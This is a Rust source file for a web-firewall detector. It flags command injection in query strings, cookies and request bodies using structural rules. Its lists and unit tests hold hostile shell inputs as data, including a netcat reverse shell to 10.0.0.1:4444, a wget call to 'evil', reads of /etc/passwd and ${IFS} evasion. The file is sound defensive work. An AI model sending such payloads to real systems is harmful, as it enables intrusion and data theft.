//! Shell/command structural detector (Phase 6).
//!
//! Command injection hides behind the same obfuscation families as SQL and
//! XSS: whitespace variants, `${IFS}` separators, encoding. This detector
//! reasons about *structure* — a shell metacharacter next to a command word,
//! sub-shell substitution (`$(…)`, backticks), or a known reverse-shell shape
//! — rather than matching one payload string.
//!
//! Tiering keeps prose safe: a bare command word ("use cat to read a file")
//! or a bare metacharacter (markdown tables, code listings) stay at Log;
//! only *metacharacter + command* combinations, sub-shells and known
//! reverse-shell/download-exec shapes reach Monitor/Block.

use super::super::{
    Action, AttackCategory, Confidence, Detector, DetectorId, DetectorResult,
    EvidenceSource, Finding, Severity,
};

use crate::canonical::CanonicalRequest;
use crate::pipeline::safe_window;

/// Default maximum value length considered by the structural analysis.
pub const DEFAULT_MAX_VALUE_LEN: usize = 8 * 1024;

/// Commands whose presence next to a shell metacharacter is an attack shape.
/// Deliberately excludes ambiguous short words (`id`, `ps`, `cp`, `rm`, …)
/// that appear in markdown tables and query parameters; those are in
/// [`WEAK_COMMANDS`].
const STRONG_COMMANDS: &[&str] = &[
    "cat", "whoami", "uname", "wget", "curl", "nc", "ncat", "netcat", "bash",
    "zsh", "dash", "python", "python3", "perl", "ruby", "socat", "chmod",
    "chown", "telnet", "ssh", "base64", "xxd",
];

/// Words that only count as evidence inside a sub-shell or for the weak
/// (Log-tier) context signal; too ambiguous for metachar adjacency.
const WEAK_COMMANDS: &[&str] = &[
    "id", "ps", "cp", "mv", "rm", "env", "printenv", "node", "dig", "nslookup",
    "mount", "sh", "kill",
];

/// Literal high-confidence shapes (block on their own).
const LITERAL_ATTACKS: &[&str] = &[
    "${ifs}",
    "/bin/sh",
    "/bin/bash",
    "/bin/zsh",
    "nc -e",
    "ncat -e",
    "/dev/tcp/",
    "socat tcp",
    "bash -i",
    "sh -i",
    "cmd.exe",
    "powershell -e",
    "powershell.exe -",
];

/// Shell metacharacters that introduce a second command.
const METACHARS: &[char] = &[';', '|', '&', '`', '\n', '\r'];

fn contains_word(haystack: &str, word: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = haystack[start..].find(word) {
        let absolute = start + pos;
        let before_ok = absolute == 0
            || !haystack.as_bytes()[absolute - 1].is_ascii_alphanumeric();
        let after = absolute + word.len();
        let after_ok = after >= haystack.len()
            || !haystack.as_bytes()[after].is_ascii_alphanumeric();
        if before_ok && after_ok {
            return true;
        }
        start = absolute + word.len().max(1);
    }
    false
}

fn find_word(low: &str, words: &[&'static str]) -> Option<&'static str> {
    words.iter().copied().find(|word| contains_word(low, word))
}

fn any_command_word(low: &str) -> Option<&'static str> {
    find_word(low, STRONG_COMMANDS).or_else(|| find_word(low, WEAK_COMMANDS))
}

/// `$(… )` or backticks containing a command word.
fn subshell_with_command(low: &str) -> bool {
    let subshell = low
        .find("$(")
        .map(|pos| safe_window(low, pos + 2, 64))
        .is_some_and(|window| any_command_word(window).is_some());
    if subshell {
        return true;
    }
    let mut start = 0;
    while let Some(pos) = low[start..].find('`') {
        let after = start + pos + 1;
        let Some(end) = low[after..].find('`') else {
            return false;
        };
        let window = &low[after..after + end];
        if any_command_word(window).is_some() {
            return true;
        }
        start = after + end + 1;
    }
    false
}

/// A shell metacharacter immediately preceding a *strong* command word.
fn metachar_before_command(low: &str) -> bool {
    for (index, ch) in low.char_indices() {
        if !METACHARS.contains(&ch) {
            continue;
        }
        let after = index + ch.len_utf8();
        let window = safe_window(low, after, 40);
        let window = window.trim_start_matches([' ', '\t']);
        if find_word(window, STRONG_COMMANDS).is_some() {
            return true;
        }
    }
    false
}

struct Evidence {
    rule: &'static str,
    severity: Severity,
    action: Action,
    score: u32,
    detail: String,
}

fn analyze(value: &str) -> Option<Evidence> {
    let low = value.to_ascii_lowercase();

    if let Some(literal) = LITERAL_ATTACKS.iter().find(|l| low.contains(**l)) {
        return Some(Evidence {
            rule: "sem.cmd.literal_shape",
            severity: Severity::Critical,
            action: Action::Block,
            score: 40,
            detail: format!("shell attack shape {literal:?}"),
        });
    }
    if subshell_with_command(&low) {
        return Some(Evidence {
            rule: "sem.cmd.subshell",
            severity: Severity::High,
            action: Action::Block,
            score: 30,
            detail: "sub-shell substitution containing a command".to_string(),
        });
    }
    if metachar_before_command(&low) {
        return Some(Evidence {
            rule: "sem.cmd.metachar_command",
            severity: Severity::High,
            action: Action::Block,
            score: 30,
            detail: "shell metacharacter followed by a command word"
                .to_string(),
        });
    }
    if any_command_word(&low).is_some()
        && low.chars().any(|c| METACHARS.contains(&c))
    {
        return Some(Evidence {
            rule: "sem.cmd.command_context",
            severity: Severity::Low,
            action: Action::Log,
            score: 5,
            detail: "command word near a shell metacharacter".to_string(),
        });
    }
    None
}

/// Shell/command structural detector.
#[derive(Debug, Clone, Copy)]
pub struct CommandInjectionDetector {
    max_value_len: usize,
}

impl CommandInjectionDetector {
    pub const fn new() -> Self {
        Self {
            max_value_len: DEFAULT_MAX_VALUE_LEN,
        }
    }

    pub const fn with_max_value_len(max_value_len: usize) -> Self {
        Self { max_value_len }
    }
}

impl Default for CommandInjectionDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for CommandInjectionDetector {
    fn id(&self) -> DetectorId {
        DetectorId("semantic.cmd.structural")
    }

    fn inspect(
        &self,
        request: &CanonicalRequest,
        ctx: &mut super::super::DetectionContext,
    ) -> DetectorResult {
        let mut findings: Vec<Finding> = Vec::new();
        let mut degraded = None;

        let scan = |value: &str,
                    source: EvidenceSource,
                    field: Option<&str>,
                    findings: &mut Vec<Finding>,
                    degraded: &mut Option<&'static str>| {
            if value.len() > self.max_value_len {
                if degraded.is_none() {
                    *degraded = Some("value exceeds semantic budget");
                }
                return;
            }
            let Some(evidence) = analyze(value) else {
                return;
            };
            let mut finding = Finding::new(
                DetectorId("semantic.cmd.structural"),
                evidence.rule,
                AttackCategory::CommandInjection,
            )
            .confidence(match evidence.action {
                Action::Block => Confidence::High,
                Action::Monitor => Confidence::Medium,
                _ => Confidence::Low,
            })
            .severity(evidence.severity)
            .score(evidence.score)
            .action(evidence.action)
            .source(source)
            .detail(evidence.detail);
            if let Some(field) = field {
                finding = finding.field(field.to_string());
            }
            findings.push(finding);
        };

        for param in request.query() {
            scan(
                &param.value,
                EvidenceSource::Query,
                Some(&param.name),
                &mut findings,
                &mut degraded,
            );
        }
        for (name, value) in request.cookies() {
            scan(
                value,
                EvidenceSource::Cookie,
                Some(name),
                &mut findings,
                &mut degraded,
            );
        }
        if let Some(body) = request.body() {
            let limit = ctx.budget().max_body_bytes.min(body.len());
            match std::str::from_utf8(&body[..limit]) {
                Ok(text) => {
                    scan(
                        text,
                        EvidenceSource::Body,
                        None,
                        &mut findings,
                        &mut degraded,
                    );
                    if body.len() > limit && degraded.is_none() {
                        degraded = Some("body scan truncated at budget");
                    }
                },
                Err(_) => {
                    if degraded.is_none() {
                        degraded = Some("body is not valid utf-8");
                    }
                },
            }
        }

        DetectorResult { findings, degraded }
    }
}

#[cfg(test)]
mod tests {
    use super::CommandInjectionDetector;
    use crate::canonical::{Canonicalizer, RequestParts};
    use crate::pipeline::{Action, AttackCategory, DetectionContext, Detector};

    fn query(value: &str) -> crate::pipeline::DetectorResult {
        let encoded = value.replace('%', "%25").replace('&', "%26");
        let target = format!("/?q={encoded}");
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "example.com",
            target,
        ));
        let detector = CommandInjectionDetector::new();
        let mut ctx = DetectionContext::new();
        detector.inspect(&request, &mut ctx)
    }

    fn tier(value: &str) -> Option<(String, Action)> {
        let result = query(value);
        result
            .findings
            .first()
            .map(|f| (f.rule_id.to_string(), f.action_hint))
    }

    #[test]
    fn literal_shapes_block() {
        for payload in [
            "1;/bin/sh",
            "nc -e /bin/sh 10.0.0.1 4444",
            "cmd.exe /c whoami",
        ] {
            let (_, action) = tier(payload).expect(payload);
            assert_eq!(action, Action::Block, "{payload}");
        }
    }

    #[test]
    fn sub_shell_with_command_blocks() {
        let (rule, action) = tier("x=$(id)").expect("finding");
        assert_eq!(rule, "sem.cmd.subshell");
        assert_eq!(action, Action::Block);

        let (_, action) = tier("x=`whoami`").expect("finding");
        assert_eq!(action, Action::Block);
    }

    #[test]
    fn metachar_before_command_blocks() {
        for payload in
            ["1;cat /etc/passwd", "1|whoami", "a && wget http://evil"]
        {
            let (_, action) = tier(payload).expect(payload);
            assert_eq!(action, Action::Block, "{payload}");
        }
    }

    #[test]
    fn ifs_evasion_blocks() {
        let (rule, action) = tier("cat${IFS}/etc/passwd").expect("finding");
        assert_eq!(rule, "sem.cmd.literal_shape"); // /etc/passwd handled elsewhere; ${IFS} also fires
        assert_eq!(action, Action::Block);
    }

    #[test]
    fn documentation_stays_weak() {
        let cases = [
            "Use cat to read the file contents.",
            "1440p | 2160p | 4320p are display resolutions",
            "curl https://example.com fetches a page",
            "The kill command sends a signal to a process.",
        ];
        for case in cases {
            if let Some((_, action)) = tier(case) {
                assert!(action < Action::Monitor, "{case:?} reached {action}");
            }
        }
    }

    #[test]
    fn category_is_command_injection() {
        let result = query("1;cat /etc/passwd");
        assert_eq!(
            result.findings[0].category,
            AttackCategory::CommandInjection
        );
    }

    #[test]
    fn oversized_values_degrade() {
        let detector = CommandInjectionDetector::with_max_value_len(16);
        let target = format!("/?q={}", ";cat /etc/passwd ".repeat(4));
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "example.com",
            target,
        ));
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        assert!(result.findings.is_empty());
        assert_eq!(result.degraded, Some("value exceeds semantic budget"));
    }
}
